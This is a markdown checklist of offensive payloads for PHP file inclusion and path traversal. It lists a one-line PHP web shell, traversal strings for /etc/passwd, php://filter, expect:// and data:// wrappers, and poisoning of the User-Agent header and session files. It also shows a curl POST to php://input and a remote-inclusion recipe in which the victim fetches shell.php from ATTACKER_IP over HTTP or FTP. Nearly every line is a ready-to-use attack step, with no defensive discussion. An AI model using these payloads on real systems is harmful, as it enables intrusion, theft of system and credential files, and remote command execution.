# PHP Shell
- `<?php system($_GET['cmd']); ?>`

# File inclusion + Path traversal

- [x] Try to navegate to /etc/passwd like: `https://[VICTIM]/?page=/etc/passwd`
- [x] Path traversal `../../../../../etc/passwd`
- [x] Url encoding ../ bypass
- [x] Php wrappers
  - `php://filter/read=convert.base64-encode/resource=index`
  - `php://filter/read=convert.base64-encode/resource=/etc/passwd`
  - `php://filter/read=convert.base64-encode/resource=config`
  - `php://filter/read=string.rot13/resource=/etc/passwd`
  - `expect://id`
  - `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id`
- [x] Null byte injection
  - `/etc/passwd%00`
- [x] User-agent poisoning:
  - `/var/log/apache2/access.log`
  - `/var/log/nginx/access.log`
  - Get php shell putting this as user-agent: `<?php system($_GET['cmd']); ?>`
  - Add this to GET request: `&cmd=id`
- [x] Cookie session poisoning:
  - `/var/lib/php/sessions/sess_[COOKIE SESSION STRING]`
- [x] Input wrapper:
  - `curl -s -X POST --data "<?php system('id'); ?>" "http://[VICTIM]/index.php?language=php://input" | grep uid`

# Remote inclusion
- [x] Create shell.php with this content: `<?php system($_GET['cmd']); ?>`
- [x] Http server:
  - `python3 -m http.server 8080 ` 
  - Upload by navigation: `http://[VICTIM IP]/index.php?language=http://[ATTACKER_IP]:8080/shell.php&cmd=id`
- [x] Ftp server:
  - `python -m pyftpdlib -p 21`
  - Upload by navigation: `http://[VICTIM IP]/index.php?language=ftp://[ATTACKER_IP]/shell.php&cmd=id`
    - If need credentials, use: `ftp://user:pass@localhost/shell.php&cmd=id`

